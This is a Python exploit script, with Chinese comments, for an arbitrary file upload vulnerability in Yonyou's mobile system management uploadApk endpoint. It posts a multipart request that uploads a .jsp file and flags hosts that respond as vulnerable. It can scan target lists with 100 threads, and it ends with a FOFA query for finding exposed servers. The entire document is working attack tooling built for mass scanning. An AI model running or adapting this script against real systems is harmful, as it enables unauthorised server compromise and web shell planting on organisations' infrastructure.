import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """用友移动系统管理uploadApk接口存在任意文件上传"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友移动系统管理uploadApk接口存在任意文件上传漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/maportal/appmanager/uploadApk.dopk_obj="
    headers = {
        "User-Agent": "Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1)",
        "Accept-Encoding": "gzip,deflate",
        "Accept": "*/*",
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "196",
    }
    data = '--fa48ebfef59b133a8cd5275661b35d2c\nContent-Disposition: form-data; name="downloadpath"; filename="59209.jsp"\nContent-Type: application/msword\n082863327\n--fa48ebfef59b133a8cd5275661b35d2c--'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        response = requests.post(url=target + payload, headers=headers, proxies=proxies,data=data,verify=False, timeout=10)
        if response.status_code == 200 and '"status":2' in response.text:
            print(f"[+]{target}存在任意文件上传漏洞")
            with open('用友移动_result.txt', 'a') as f:
                f.write(f"{target}存在任意文件上传漏洞\n")
        else:
            print(f"[-]{target}不存在任意文件上传漏洞")
    except:
        print(f"{target}可能存在任意文件上传漏洞")
if __name__ == '__main__':
    main()

# fofa语句
# body="../js/jslib/jquery.blockUI.js"